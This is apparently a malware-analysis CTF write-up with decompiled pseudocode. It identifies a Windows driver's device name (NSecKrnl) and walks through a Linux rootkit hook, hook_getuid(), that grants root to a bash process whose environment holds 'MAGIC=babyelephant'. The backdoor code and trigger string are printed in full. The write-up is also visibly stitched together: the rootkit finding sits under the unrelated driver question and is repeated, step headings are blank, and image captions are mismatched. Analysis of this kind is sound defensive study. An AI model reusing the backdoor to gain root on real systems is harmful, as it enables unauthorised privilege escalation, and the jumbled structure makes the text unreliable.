## Qs1:

> **Question:** The driver exposes itself to usermode applications under a specific name. What is this name?

**Answer:**

```text
NSecKrnl
```

**Finding:** 

**Finding:** The privilege-escalation hook grants root when a process named `bash` has `MAGIC=babyelephant` set in its environment.

<details>
<summary>Step 1 — </summary>

<details>
<summary>Decompiled Pseudocode</summary>

```c
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
  _security_init_cookie();
  return sub_14000114C(DriverObject);
}
```

<details>
<summary>Disassembly View</summary>

![Qs8 Step 1 — ](Artifacts/)

</details>

</details>

</details>

<details>
<summary>Step 2 — </summary>

<details>
<summary>Decompiled Pseudocode</summary>

```c
NTSTATUS __fastcall sub_14000114C(PDRIVER_OBJECT DriverObject)
{
  NTSTATUS result; // eax
  NTSTATUS v3; // ebx
  struct _UNICODE_STRING DestinationString; // [rsp+40h] [rbp-28h] BYREF
  struct _UNICODE_STRING SymbolicLinkName; // [rsp+50h] [rbp-18h] BYREF
  PDEVICE_OBJECT DeviceObject; // [rsp+70h] [rbp+8h] BYREF

  *((_DWORD *)DriverObject->DriverSection + 26) |= 0x20u;
  SpinLock = 0;
  RtlInitUnicodeString(&DestinationString, SourceString: L"\\Device\\NSecKrnl");
  RtlInitUnicodeString(DestinationString: &SymbolicLinkName, SourceString: L"\\DosDevices\\NSecKrnl");
  DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_140001010;
  DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_140001010;
  DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_140001030;
  DriverObject->DriverUnload = (PDRIVER_UNLOAD)sub_1400010E0;
  result = IoCreateDevice(
             DriverObject,
             DeviceExtensionSize: 0,
             DeviceName: &DestinationString,
             DeviceType: 0x22u,
             DeviceCharacteristics: 0,
             Exclusive: 0,
             &DeviceObject);
  if ( result >= 0 )
  {
    v3 = IoCreateSymbolicLink(&SymbolicLinkName, DeviceName: &DestinationString);
    if ( v3 >= 0 )
    {
      byte_140003010 = PsSetCreateProcessNotifyRoutine(NotifyRoutine: NotifyRoutine, Remove: 0) >= 0;
      byte_140003011 = PsSetLoadImageNotifyRoutine(NotifyRoutine: guard_check_icall_nop) >= 0;
      sub_140001518();
    }
    else
    {
      IoDeleteDevice(DeviceObject);
    }
    return v3;
  }
  return result;
}
```
</details>

<details>
<summary>Disassembly View</summary>

![Qs2 — Disassembly view of / init_module](Artifacts/)

</details>

---


**Finding:** The privilege-escalation hook grants root when a process named `bash` has `MAGIC=babyelephant` set in its environment.

<details>
<summary>Step 1 — Identify the privilege-escalation hook installer</summary>

`become_root_init()` installs the predefined hook table via `fh_install_hooks()`:

```c
int __cdecl become_root_init()
{
  return fh_install_hooks(hooks, 0xAu);
}
```

<details>
<summary>Disassembly View</summary>

![Qs8 Step 1 — Disassembly view of become_root_init](Artifacts/Malops-CTF-Singularity-Qs8-Identify-Privilege-Escalation-Hooks-Disassembly-View.png)

</details>

</details>

<details>
<summary>Step 2 — Trace the installed hooks</summary>

Following the `hooks` table in IDA resolves each installed hook. Among them, `hook_getuid()` is the function responsible for the privilege-escalation logic.

<details>
<summary>Disassembly View</summary>

![Qs8 Step 2 — Disassembly view of the installed hooks table](Artifacts/Malops-CTF-Singularity-Qs8-Installed-Hooks-Disassembly-View.png)

</details>

</details>

<details>
<summary>Step 3 — Inspect hook_getuid()</summary>

`hook_getuid()` first confirms the calling process name is `"bash"`, then reads the process environment (via `access_process_vm`) and searches it with `strstr()` for a hardcoded marker string.

```c
__int64 __fastcall hook_getuid(const pt_regs *regs)
{
  unsigned __int64 v1; // rbp
  __int64 v3; // r12
  __int64 v4; // rax
  const char *v5; // r13
  int v6; // eax
  char *v7; // rdx
  __int64 v8; // rax
  _QWORD *v9; // rax

  v1 = __readgsqword((unsigned int)&const_pcpu_hot);
  if ( strcmp(s1: (const char *)(v1 + 2976), s2: "bash") == 0 )
  {
    v3 = *(_QWORD *)(v1 + 2304);
    if ( v3 != 0 && *(_QWORD *)(v3 + 384) != 0 && *(_QWORD *)(v3 + 392) != 0 )
    {
      v4 = _kmalloc_cache_noprof(a1: kmalloc_caches[12], a2: 2080, a3: 4096);
      v5 = (const char *)v4;
      if ( v4 != 0 )
      {
        v6 = access_process_vm(a1: v1, a2: *(_QWORD *)(v3 + 384), a3: v4, a4: 4095, a5: 0);
        if ( v6 > 0 )
        {
          if ( v6 != 1 )
          {
            v7 = (char *)v5;
            v8 = (__int64)&v5[v6 - 2 + 1];
            do
            {
              if ( *v7 == 0 )
                *v7 = 32;
              ++v7;
            }
            while ( v7 != (char *)v8 );
          }
          if ( strstr(haystack: v5, needle: "MAGIC=babyelephant") != nullptr )
          {
            v9 = (_QWORD *)prepare_creds();
            if ( v9 != nullptr )
            {
              v9[1] = 0;
              v9[2] = 0;
              v9[3] = 0;
              v9[4] = 0;
              commit_creds(a1: v9);
            }
          }
        }
        kfree(a1: v5);
      }
    }
  }
  return orig_getuid(a1: regs);
}
```

The magic string lives in the read-only data section (`.rodata.str1.1`) and is referenced by `hook_getuid()` as the `strstr()` search needle: `MAGIC=babyelephant`.

<details>
<summary>Disassembly View</summary>
